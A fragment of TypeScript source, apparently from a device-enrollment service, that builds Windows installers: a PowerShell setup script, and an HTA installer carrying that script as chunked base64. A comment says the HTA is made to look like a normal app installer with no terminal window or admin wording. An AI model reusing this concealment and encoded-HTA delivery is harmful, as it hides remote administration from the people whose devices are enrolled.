      "Write-Host ''",
      "Write-Host 'Setup complete. Device should show Online on the admin dashboard.' -ForegroundColor Green",
      "} catch {",
      "  $errMsg = $_.Exception.Message",
      "  try { Log (\"SETUP FAILED: $errMsg\") } catch {}",
      "  try { [IO.File]::WriteAllText((Join-Path $DataDir 'setup.failed'), $errMsg) } catch {}",
      "  try { [IO.File]::WriteAllText($PublicFailed, $errMsg) } catch {}",
      "  throw",
      "}",
    ].join('\n');
  }

  /**
   * Guest-facing Windows GUI installer (.hta). Looks like a normal app installer
   * — no black terminal window, no dashboard/admin wording.
   */
  buildWindowsGuiInstaller(code: string, apiUrl: string, template?: string | null): string {
    const safeCode = code.replace(/[^A-Za-z0-9]/g, '');
    const encoded = this.encodePsCommand(
      this.buildWindowsInlineSetupScript({ apiUrl: apiUrl.replace(/\/$/, ''), guestCode: safeCode }),
    );
    const chunkSize = 3500;
    const chunks: string[] = [];
    for (let i = 0; i < encoded.length; i += chunkSize) {
      chunks.push(encoded.slice(i, i + chunkSize));
    }
    return buildGuestInstallerHta(safeCode, apiUrl, chunks, template);
  }

  private encodePsCommand(script: string): string {
    return Buffer.from(script, 'utf16le').toString('base64');
  }

  buildWindowsInstallerScript(code: string, apiUrl: string): string {
    // Served as windows.ps1 — same robust enroll path the .bat downloads and runs.
    return this.buildWindowsInlineSetupScript({
      apiUrl: apiUrl.replace(/\/$/, ''),
      guestCode: code.replace(/[^A-Za-z0-9]/g, ''),
    });
  }

}
